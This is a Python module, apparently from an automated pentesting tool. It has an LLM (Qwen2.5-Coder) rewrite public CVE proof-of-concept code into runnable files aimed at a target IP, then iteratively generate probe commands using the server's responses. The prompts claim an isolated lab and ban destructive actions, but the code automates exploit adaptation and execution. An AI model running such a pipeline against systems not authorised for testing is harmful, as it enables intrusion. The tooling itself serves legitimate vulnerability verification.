# PoC 優先驗證：若 CVE 自帶 PoC 程式碼，交給 qwen2.5-coder 改寫成可執行檔
# =============================================================================

def extract_poc_scripts(cve: dict) -> list:
    """從 CVE 取出「真的是程式碼」的 PoC（排除純網址）。
    share_memory 裡的 cve['PoC'] 是字串 list，有些是腳本內容、有些只是 URL。
    這裡只留下看起來像程式碼的（排除以 http 開頭的純連結）。"""
    out = []
    for p in cve.get("PoC", []) or []:
        if not isinstance(p, str):
            continue
        s = p.strip()
        if not s:
            continue
        # 純網址（整段就是一個連結）→ 不算可執行 PoC
        if s.lower().startswith(("http://", "https://")) and "\n" not in s and len(s.split()) <= 1:
            continue
        # 太短（像一句話）也略過
        if len(s) < 30:
            continue
        out.append(s)
    return out


ADAPT_POC_SYSTEM_PROMPT = """You are Qwen2.5-Coder acting as an exploit adaptation engineer in an
isolated penetration-testing lab. You are given a raw public PoC for a CVE and the TARGET_IP of the
lab device. Rewrite the PoC into ONE self-contained, directly-runnable file that targets TARGET_IP.

STRICT RULES:
1. Output ONLY a JSON object: {"language": "python|bash", "filename": "poc_xxx.py", "content": "<full file>", "run_cmd": "python3 poc_xxx.py"}.
2. Replace every hard-coded target host/IP/placeholder in the original PoC with the given TARGET_IP.
3. Keep it self-contained: only use the Python standard library (socket, urllib, http.client, struct...) or basic shell tools (curl/wget). Do NOT require pip packages that may be missing.
4. The file must PRINT clear evidence to stdout so the caller can judge success (e.g. the server response, a leaked string, 'VULNERABLE' / 'NOT VULNERABLE').
5. Do NOT perform destructive actions (no rm, no flooding, no fork bombs). Verification/probing only.
6. If the PoC is a DoS/crash exploit, do NOT actually crash the target — instead just send a single probe and report what came back.
7. No markdown, no commentary, JSON only.
"""


_THIRDPARTY_IMPORTS = re.compile(
    r"^\s*(?:import|from)\s+(requests|bs4|scapy|paramiko|pwn|lxml|selenium|numpy|flask)\b",
    re.MULTILINE,
)


def _py_syntax_error(content: str):
    """回傳 Python 語法錯誤訊息字串；語法正確回 None。"""
    try:
        ast.parse(content)
        return None
    except SyntaxError as e:
        return f"SyntaxError: {e.msg} (line {e.lineno})"
    except Exception as e:
        return f"ParseError: {e}"


def _thirdparty_imports(content: str):
    """回傳用到的第三方套件清單（容器通常沒裝 → 會 import 失敗）。"""
    return sorted(set(_THIRDPARTY_IMPORTS.findall(content or "")))


def adapt_poc_to_file(cve: dict, target_ip: str, raw_poc: str, context: str = "") -> dict:
    """讓 qwen2.5-coder 把一段原始 PoC 改寫成可執行檔（換成靶機 IP、補成完整檔）。
    context：偵察到的真實端點/裝置資訊，協助改寫時打對位置。
    回傳 {"language","filename","content","run_cmd"}；失敗回 None。"""
    cve_id = cve.get("cve_id") or cve.get("cveID") or "CVE"

    context_block = f"\nRECON CONTEXT (real endpoints/services on this target):\n{context[:1500]}\n" if context else ""

    user_payload = (
        f"TARGET_IP: {target_ip}\n"
        f"CVE_ID: {cve_id}\n"
        f"DESCRIPTION:\n{str(cve.get('description',''))[:1000]}\n"
        f"{context_block}\n"
        f"RAW POC (adapt this):\n{raw_poc[:4000]}\n\n"
        f"Rewrite into ONE runnable file targeting {target_ip}. JSON only."
    )

    try:
        resp = _call_llm_json_guarded(
            guard_timeout=POC_ADAPT_TIMEOUT + 10,   # 應用層守門，略大於 socket 逾時
            timeout=POC_ADAPT_TIMEOUT,              # 傳到底層 → socket 也給這麼久
            system_prompt=ADAPT_POC_SYSTEM_PROMPT,
            user_content=user_payload,
            response_schema=POC_FILE_SCHEMA,
            model_name=GENERATION_MODEL,
        )
    except FutureTimeout:
        log_info.warn(
            f"⏱️ [PoC 改寫] {cve_id} 超過 {POC_ADAPT_TIMEOUT}s 未回應（LLM 疑似卡住），放棄本段 PoC、繼續。"
        )
        return None
    except Exception as e:
        log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 例外: {e}")
        return None

    if not isinstance(resp, dict):
        return None

    language = (resp.get("language") or "").lower().strip()
    filename = (resp.get("filename") or "").strip()
    content = resp.get("content") or ""
    run_cmd = (resp.get("run_cmd") or "").strip()

    if not content or not filename:
        log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 產出不完整，略過。")
        return None

    # 安全檢查：擋掉明顯破壞性內容（集中黑名單）
    if _DESTRUCTIVE_RE.search(content):
        log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 內容含破壞性指令，拒絕執行。")
        return None

    # =====================================================================
    # ✅【語法檢查 + 自動修一輪】7B 常產出語法錯、或用容器沒裝的第三方庫（requests…），
    #    直接跑就壞。這裡先檢查，有問題把「錯誤 + 原碼」丟回 7B 修一次再驗；
    #    修完仍壞才放棄。只檢查 Python（bash 跳過）。
    # =====================================================================
    is_python = (language == "python") or filename.endswith(".py")
    if is_python:
        syn_err = _py_syntax_error(content)
        tp = _thirdparty_imports(content)
        if syn_err or tp:
            problems = []
            if syn_err:
                problems.append(syn_err)
            if tp:
                problems.append(f"uses non-stdlib packages {tp} (container may not have them; "
                                f"rewrite using only the standard library: urllib, http.client, socket, ssl, struct)")
            log_info.warn(f"🔧 [PoC 改寫] {cve_id} 產出有問題（{'; '.join(problems)}），請 7B 修一輪…")
            repair_payload = (
                f"The following PoC file for {cve_id} targeting {target_ip} has problems:\n"
                f"PROBLEMS: {'; '.join(problems)}\n\n"
                f"FILE ({filename}):\n{content[:4000]}\n\n"
                f"Return the FIXED file as JSON {{language, filename, content, run_cmd}}. "
                f"Fix the syntax and replace any non-stdlib import with standard-library equivalents. "
                f"Keep it self-contained and targeting {target_ip}. JSON only."
            )
            try:
                fixed = _call_llm_json_guarded(
                    guard_timeout=POC_ADAPT_TIMEOUT + 10,
                    timeout=POC_ADAPT_TIMEOUT,
                    system_prompt=ADAPT_POC_SYSTEM_PROMPT,
                    user_content=repair_payload,
                    response_schema=POC_FILE_SCHEMA,
                    model_name=GENERATION_MODEL,
                )
                if isinstance(fixed, dict) and fixed.get("content"):
                    content = fixed.get("content") or content
                    filename = (fixed.get("filename") or filename).strip()
                    run_cmd = (fixed.get("run_cmd") or run_cmd).strip()
                    language = (fixed.get("language") or language).lower().strip()
                    is_python = (language == "python") or filename.endswith(".py")
                    # 修完的版本同樣過一次破壞性黑名單
                    if _DESTRUCTIVE_RE.search(content):
                        log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 修復後內容含破壞性指令，拒絕執行。")
                        return None
            except FutureTimeout:
                log_info.warn(f"⏱️ [PoC 改寫] {cve_id} 修復逾時，沿用原版嘗試。")
            except Exception as e:
                log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 修復例外: {e}，沿用原版嘗試。")

            # 修完再驗一次：Python 仍有語法錯就放棄（避免跑一個必定壞的檔）
            if is_python:
                syn_err2 = _py_syntax_error(content)
                if syn_err2:
                    log_info.warn(f"❌ [PoC 改寫] {cve_id} 修復後仍有語法錯（{syn_err2}），放棄本段 PoC。")
                    return None
                leftover_tp = _thirdparty_imports(content)
                if leftover_tp:
                    log_info.warn(f"⚠️ [PoC 改寫] {cve_id} 修復後仍用到第三方庫 {leftover_tp}，執行時可能 import 失敗。")

    # 補 run_cmd（若 LLM 沒給）
    if not run_cmd:
        if language == "python" or filename.endswith(".py"):
            run_cmd = f"python3 {filename}"
        else:
            run_cmd = f"bash {filename}"

    return {"language": language, "filename": filename, "content": content, "run_cmd": run_cmd}


# =============================================================================
# 🔁【回饋迴圈 Feedback Loop】
# 舊做法：一次盲生 5 條指令照跑，LLM 看不到前一條打出去的結果 → 一直亂猜。
# 新做法：生 1 條 → 跑 → 把「指令 + 真實回應」當歷史餵回去 → LLM 看了回應再生下一條。
#         這讓 7B「吸收剛剛看到的東西」，用上一步的真實回應修正下一步（in-context 成長）。
#   - 若某次回應已證明有漏洞 → LLM 回 done=true（呼叫端命中後本來就會停）。
#   - 若 LLM 判斷沒東西可試了 → done=true，呼叫端據此提早停，不浪費剩餘次數。
# 本函式「永遠」回一個可跑的 dict（LLM 失敗/逾時就給保底探測），讓 main 迴圈很乾淨。
# =============================================================================

POC_FEEDBACK_SYSTEM_PROMPT = """You are a penetration testing assistant powered by Qwen2.5-Coder,
running an ITERATIVE verification loop for ONE CVE on an ISOLATED lab device.
You are given the CVE, the TARGET_IP, recon context, and the HISTORY of commands already tried
together with the server's ACTUAL responses. Decide the SINGLE next shell command that best
advances verifying whether the target is vulnerable, LEARNING from what the responses revealed.

TOOL SELECTION — match the tool to the service/protocol, do NOT default to curl (curl = HTTP only):
  HTTP/CGI/SOAP/HNAP → curl · TLS → openssl s_client · raw TCP → nc or python3 socket ·
  DNS → dig · SNMP → snmpwalk · UPnP/SSDP → curl XML URL or python M-SEARCH · NTP → ntpq ·
  TFTP(udp/69) → curl 'tftp://IP/<path>'  · FTP(tcp/21) → curl 'ftp://IP/<path>' ·
  complex logic/struct/loops → short python3 -c "..." (stdlib only). Use RECON CONTEXT ports to choose.

STRICT RULES:
1. Output ONLY a JSON object: {"command": "<one shell command>", "done": false, "reason": "<short>"}.
2. "command": ONE single-line, directly-runnable Linux command targeting TARGET_IP, using the RIGHT
   tool for this CVE's protocol (see TOOL SELECTION) — not always curl. Never use placeholder hosts.
3. LEARN FROM HISTORY: if a path already returned 404 / "not found", do NOT repeat it — pivot to a
   different path, method, header or payload suggested by what you actually saw (links, forms,
   error strings, Server header, SOAP actions).
4. If a PREVIOUS RESPONSE already PROVES the vulnerability (leaked credentials/config, SQL error,
   auth bypass, device settings dump), set "done": true and return a minimal command that confirms it.
5. If you have exhausted sensible options and nothing indicates vulnerability, set "done": true and
   return one harmless final probe, explaining in "reason" that no further test is meaningful.
6. PREFER real endpoints from RECON CONTEXT over guessing generic paths like /status or /api.
7. When you use a PROVEN PAYLOAD TEMPLATE, copy its quoting EXACTLY (keep the single quotes as-is,
   do not switch to double quotes or add stray quotes) and do NOT append output filters such as
   | grep / | head / | awk — the caller needs the FULL raw response to judge success.
8. No markdown, no commentary. JSON only.
"""

# 單條「下一步指令」的 JSON schema（給原生 Ollama format= 用；LangChain 路徑走 JSON 解析）
POC_NEXT_SCHEMA = {
    "type": "object",
    "properties": {
        "command": {"type": "string"},
        "done": {"type": "boolean"},
        "reason": {"type": "string"},
    },
    "required": ["command"],
}


def _format_history(history, max_items: int = 6, resp_cap: int = 500) -> str:
    """把已試過的 (指令, 回應) 整理成文字，只留最近 max_items 筆、每筆回應截 resp_cap 字。"""
    if not history:
        return "(none yet — this is the first attempt)"
    recent = history[-max_items:]
    lines = []
    for i, h in enumerate(recent, 1):
        cmd = str(h.get("cmd", ""))[:200]
        resp = str(h.get("response", ""))
        resp = re.sub(r"\s+", " ", resp).strip()[:resp_cap]
        lines.append(f"[{i}] CMD: {cmd}\n    RESP: {resp or '(empty)'}")
    return "\n".join(lines)


def generate_next_poc_cmd(cve: dict, target_ip: str, context: str = "", history=None,
                          vuln_class: str = None, nonce_echo: str = None) -> dict:
    """回饋迴圈核心：根據『CVE + 真實端點上下文 + 已試過的指令與回應』決定下一條指令。
    永遠回傳 {"command","done","reason"}（LLM 失敗/逾時/亂填時給保底探測），
    讓 main 的驗證迴圈不需處理 None。
    vuln_class / nonce_echo：由流程傳入——提供「已驗證 payload 模板」與「執行回顯驗證碼」，
    讓 7B 只填端點/參數、套用骨架，而不是自己發明 exploit 結構。"""
    history = history or []
    cve_id = cve.get("cve_id") or cve.get("cveID") or "UNKNOWN"
    if not vuln_class:
        vuln_class = classify_cve(cve)

    def _fallback(reason: str) -> dict:
        probe = _fallback_cmds(cve, target_ip, 5)[len(history) % 5]
        return {"command": probe, "done": False, "reason": reason}

    poc_hint = ""
    poc_list = cve.get("PoC", [])
    if isinstance(poc_list, list) and poc_list:
        poc_hint = "\n".join(str(p)[:600] for p in poc_list[:2])

    context_block = ""
    if context:
        context_block = (
            f"\nRECON CONTEXT (real endpoints/services on THIS target — PREFER these):\n{context[:1600]}\n"
        )

    # 路徑穿越等類別依協定(HTTP/TFTP/FTP)選對模板組，避免拿 HTTP curl 去打 TFTP 漏洞
    tmpl_key = _effective_template_key(vuln_class, cve)
    templates_block = _templates_block(tmpl_key, target_ip, nonce_echo)

    user_payload = (
        f"TARGET_IP: {target_ip}\n"
        f"CVE_ID: {cve_id}\n"
        f"VULN_CLASS: {vuln_class}\n"
        f"CVSS: {cve.get('score') or cve.get('cvss') or 'N/A'}\n"
        f"DESCRIPTION:\n{str(cve.get('description',''))[:1200]}\n"
        f"{context_block}\n"
        f"{templates_block}\n"
        f"POC_HINTS (may be empty):\n{poc_hint[:1000]}\n\n"
        f"HISTORY (commands already tried and the server's ACTUAL responses):\n"
        f"{_format_history(history)}\n\n"
        f"Decide the SINGLE next command. If PROVEN PAYLOAD TEMPLATES are given above, you MUST "
        f"instantiate ONE of them against a real endpoint from RECON (replace {{EP}}/{{PARAM}}, keep "
        f"any provided nonce verbatim) rather than inventing payload structure. "
        f"Learn from the responses above. JSON only."
    )

    try:
        resp = _call_llm_json_guarded(
            system_prompt=POC_FEEDBACK_SYSTEM_PROMPT,
            user_content=user_payload,
            response_schema=POC_NEXT_SCHEMA,
            model_name=GENERATION_MODEL,
        )
    except FutureTimeout:
        log_info.warn(
            f"⏱️ [回饋迴圈] {cve_id} 第 {len(history)+1} 步超過 {LLM_CALL_TIMEOUT}s 未回應，改用保底探測並繼續。"
        )
        return _fallback("LLM 逾時，改用保底探測")
    except Exception as e:
        log_info.warn(f"⚠️ [回饋迴圈] {cve_id} 第 {len(history)+1} 步例外: {e}，改用保底探測。")
        return _fallback(f"LLM 例外: {e}")

    if not isinstance(resp, dict):
        return _fallback("LLM 回應格式異常")

    cmd = _sanitize_cmd(resp.get("command", ""), target_ip)
    if not cmd:
        return _fallback("LLM 未產出有效指令")

    return {
        "command": cmd,
        "done": bool(resp.get("done", False)),
        "reason": str(resp.get("reason", ""))[:200],
    }